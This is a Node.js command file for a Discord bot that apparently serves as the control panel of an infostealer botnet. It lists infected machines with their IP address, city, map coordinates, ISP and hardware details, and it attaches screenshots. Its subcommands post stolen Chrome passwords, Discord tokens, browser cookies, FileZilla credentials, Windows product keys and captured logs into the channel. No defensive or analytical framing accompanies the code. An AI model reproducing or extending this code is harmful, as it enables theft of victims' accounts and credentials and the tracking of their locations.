const fs = require("fs");
const moment = require("moment");
const Discord = require("discord.js");
const paginationEmbed = require("discord.js-pagination");
const db = require("../models");
const Op = db.Sequelize.Op;

exports.run = (client, message, args) => {
    if (args.length == 0) {
        db.Bots.findAll().then((results) => {
            if (results.length > 0) {
                const clientsPerPage = 3;
                let pages = [];
                let fields = [];

                for (const [index, element] of results.reverse().entries()) {
                    let expDate = new Date();
                    expDate.setTime(expDate.getTime() - 5 * 60 * 1000);
                    const formattedDate =
                        element.updatedAt > expDate ? "Online" : "Offline";

                    fields.push({
                        name: !element.tag ? "No tag" : element.tag,
                        value: `
                            **ID**: ${element.id}
                            **Status**: ${formattedDate}
                            **Last connection**: \n${moment(
                                element.updatedAt
                            ).format("YYYY-MM-DD HH:mm:ss")}
                            **IP Address**: ${element.ipAddress}
                            **Country**: ${element.country}
                            **OS**: ${element.operatingSystem}
                            **Version**: ${element.version}
                        `,
                        inline: true,
                    });

                    if (
                        index % clientsPerPage == 2 ||
                        index == results.length - 1
                    ) {
                        const embed = new Discord.MessageEmbed()
                            .setColor("#0099ff")
                            .addFields(fields);

                        pages.push(embed);
                        fields = [];
                    }
                }

                paginationEmbed(message, pages);
            } else {
                message.channel.send("No clients connected");
            }
        });
    } else if (args.length == 1) {
        db.Bots.findAll({
            where: {
                [Op.or]: [
                    {
                        id: args[0],
                    },
                    {
                        tag: args[0],
                    },
                ],
            },
        }).then(async (results) => {
            if (results.length > 0) {
                const element = results[0];
                const screenshotData = await db.Screenshots.findAll({
                    where: {
                        identifier: element.identifier,
                    },
                });
                const chromeData = await db.Chrome.findAll({
                    where: {
                        identifier: element.identifier,
                    },
                });
                const cookieData = await db.Cookies.findAll({
                    where: {
                        identifier: element.identifier,
                    },
                });
                const discordData = await db.Discord.findAll({
                    where: {
                        identifier: element.identifier,
                    },
                });
                const filezillaData = await db.Filezilla.findAll({
                    where: {
                        identifier: element.identifier,
                    },
                });

                const winKey =
                    element.windowsKey && element.windowsKey != "" ? 1 : 0;

                const screenShotPath =
                    screenshotData.length > 0 ? screenshotData[0].link : "";

                const chromeLength = chromeData.length;

                const cookieLength =
                    cookieData.length > 0
                        ? cookieData[0].cookies.split(/HOST/).length
                        : 0;

                const tokensLength =
                    discordData.length > 0
                        ? discordData[0].tokens.split(/TOKEN/).length
                        : 0;

                const filezillaLength = filezillaData.length;

                let expDate = new Date();
                expDate.setTime(expDate.getTime() - 5 * 60 * 1000);
                const formattedDate =
                    element.updatedAt > expDate ? "Online" : "Offline";

                const embed = new Discord.MessageEmbed()
                    .setColor("#0099ff")
                    .addFields({
                        name: !element.tag ? "No tag found" : element.tag,
                        value: `
                            **ID**: ${element.id}
                            **Status**: ${formattedDate}
                            **IP Address**: ${element.ipAddress}
                            **Country**: ${element.country}
                            **Region**: ${element.region}
                            **City**: ${element.city}
                            **Location**: https://www.google.com/maps/search/?api=1&query=${element.lat},${element.lon}
                            **ISP**: ${element.isp}
                            **OS**: ${element.operatingSystem}
                            **Release**: ${element.release}
                            **Version**: ${element.version}
                            **Computer Name**: ${element.nodeName}
                            **Processor**: ${element.processor}
                            **Architecture**: ${element.architecture}
                            **Boot Time**: ${element.bootTime}
                            **Memory**: ${element.memory}
                            **Available Info**: \`Windows Key ${winKey}\` \`Chrome ${chromeLength}\` \`Cookies ${cookieLength}\` \`Discord ${tokensLength}\` \`FileZilla ${filezillaLength}\` \`Logs ${element.logSize}\``,
                    })
                    .setThumbnail(
                        `https://www.countryflags.io/${element.countryCode}/flat/64.png`
                    )
                    .setFooter(
                        `Last connection: ${moment(element.updatedAt).format(
                            "YYYY-MM-DD HH:mm:ss"
                        )}`
                    );

                if (fs.existsSync(screenShotPath)) {
                    const attachment = new Discord.MessageAttachment(
                        screenShotPath,
                        "screenshot.jpg"
                    );

                    embed
                        .attachFiles(attachment)
                        .setImage("attachment://screenshot.jpg");
                }

                message.channel.send(embed);
            } else {
                message.channel.send("Client not found");
            }
        });
    } else if (args.length == 2) {
        if (args[1] == "winkey") {
            db.Bots.findAll({
                where: {
                    [Op.or]: [
                        {
                            id: args[0],
                        },
                        {
                            tag: args[0],
                        },
                    ],
                },
            }).then(async (result) => {
                if (
                    result.length > 0 &&
                    result[0].windowsKey &&
                    result[0].windowsKey.length > 0
                ) {
                    message.channel.send(`\`\`\`${result[0].windowsKey}\`\`\``);
                } else {
                    message.channel.send("Windows Key not found");
                }
            });
        } else if (args[1] == "chrome") {
            db.Bots.findAll({
                where: {
                    [Op.or]: [
                        {
                            id: args[0],
                        },
                        {
                            tag: args[0],
                        },
                    ],
                },
            }).then(async (result) => {
                if (result.length > 0) {
                    db.Chrome.findAll({
                        where: {
                            identifier: result[0].identifier,
                        },
                    }).then((results) => {
                        if (results.length > 0) {
                            let output = "";
                            results.forEach((element, i) => {
                                output =
                                    output +
                                    `HOST: ${element.host}\nUSERNAME: ${element.user}\nPASSWORD: ${element.password}\n\n`;
                            });
                            message.channel.send("```" + output + "```");
                        } else {
                            message.channel.send("No Chrome data found");
                        }
                    });
                } else {
                    message.channel.send("Client not found");
                }
            });
        } else if (args[1] == "discord") {
            db.Bots.findAll({
                where: {
                    [Op.or]: [
                        {
                            id: args[0],
                        },
                        {
                            tag: args[0],
                        },
                    ],
                },
            }).then(async (result) => {
                if (result.length > 0) {
                    db.Discord.findAll({
                        where: {
                            identifier: result[0].identifier,
                        },
                    }).then((results) => {
                        if (results.length > 0) {
                            message.channel.send(
                                "```" + results[0].tokens + "```"
                            );
                        } else {
                            message.channel.send("No Discord tokens found");
                        }
                    });
                } else {
                    message.channel.send("Client not found");
                }
            });
        } else if (args[1] == "cookies") {
            db.Bots.findAll({
                where: {
                    [Op.or]: [
                        {
                            id: args[0],
                        },
                        {
                            tag: args[0],
                        },
                    ],
                },
            }).then(async (result) => {
                if (result.length > 0) {
                    db.Cookies.findAll({
                        where: {
                            identifier: result[0].identifier,
                        },
                    }).then((results) => {
                        if (results.length > 0) {
                            message.channel.send(
                                new Discord.MessageAttachment(
                                    Buffer.from(results[0].cookies, "utf-8"),
                                    "cookies.txt"
                                )
                            );
                        } else {
                            message.channel.send("No Cookies found");
                        }
                    });
                } else {
                    message.channel.send("Client not found");
                }
            });
        } else if (args[1] == "filezilla") {
            db.Bots.findAll({
                where: {
                    [Op.or]: [
                        {
                            id: args[0],
                        },
                        {
                            tag: args[0],
                        },
                    ],
                },
            }).then(async (result) => {
                if (result.length > 0) {
                    db.Filezilla.findAll({
                        where: {
                            identifier: result[0].identifier,
                        },
                    }).then((results) => {
                        if (results.length > 0) {
                            let output = "";
                            results.forEach((element, i) => {
                                output =
                                    output +
                                    `HOST: ${element.host}\nPORT: ${element.port}\nUSERNAME: ${element.user}\nPASSWORD: ${element.password}\n\n`;
                            });
                            message.channel.send("```" + output + "```");
                        } else {
                            message.channel.send("No Filezilla data found");
                        }
                    });
                } else {
                    message.channel.send("Client not found");
                }
            });
        } else if (args[1] == "logs") {
            db.Bots.findAll({
                where: {
                    [Op.or]: [
                        {
                            id: args[0],
                        },
                        {
                            tag: args[0],
                        },
                    ],
                },
            }).then(async (result) => {
                if (result.length > 0) {
                    const logPath =
                        "./server/logs/" + result[0].identifier + ".txt";
                    if (fs.existsSync(logPath)) {
                        message.channel.send(
                            new Discord.MessageAttachment(logPath, "logs.txt")
                        );
                    } else {
                        message.channel.send("Logs not found");
                    }
                } else {
                    message.channel.send("Client not found");
                }
            });
        } else {
            message.channel.send("Invalid argument");
        }
    }
};
